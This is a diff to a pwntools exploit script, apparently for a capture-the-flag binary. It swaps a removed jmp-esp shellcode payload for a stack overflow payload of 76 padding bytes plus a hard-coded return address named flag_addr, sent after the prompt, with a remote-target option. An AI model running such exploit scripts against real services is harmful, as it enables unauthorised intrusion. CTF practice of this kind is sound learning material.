@@ -12,7 +12,7 @@ continue
 '''.format(**locals())
 
 # Binary filename [CHANGE THIS]
-exe = './filename'
+exe = './file'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=True)
 
@@ -24,7 +24,7 @@ print(architecture)
 context.log_level = 'debug'
 
 #set prompt from program to listen for
-prompt = "" #[Change this]
+prompt = "What do you have to say?" #[Change this]
 
 # ===========================================================
 #                    CONFIG ENDS HERE
@@ -35,7 +35,7 @@ def start(argv=[], *a, **kw):
     if args.GDB: #if user wants to run with gdb
         #specify gdb script
         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE: #if user wants to run against REMOTE (host, port)
+    elif args.REMOTE: #if user wants to run against remote (host, port)
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else: #user wants to run locally
         return process([exe] + argv, *a, **kw)
@@ -79,18 +79,19 @@ def main():
 
     pprint(elf.got)
 
-    jmp_esp = next(elf.search(asm("jmp esp")))
-    shellcode = asm(shellcraft.sh())
+    flag_addr = "\x76\x85\x04\x08"
 
-
-    payload = flat({
+    """ payload = flat({
         offset: [
-
+            flag_addr
         ]
-    })
+    } """
 
+    #print("payload1: {}".format(payload))
+    payload = "A" * 76 + flag_addr
 
-    io.sendline(payload)
+    io.sendlineafter(prompt, payload)
+
     io.interactive()
 
 
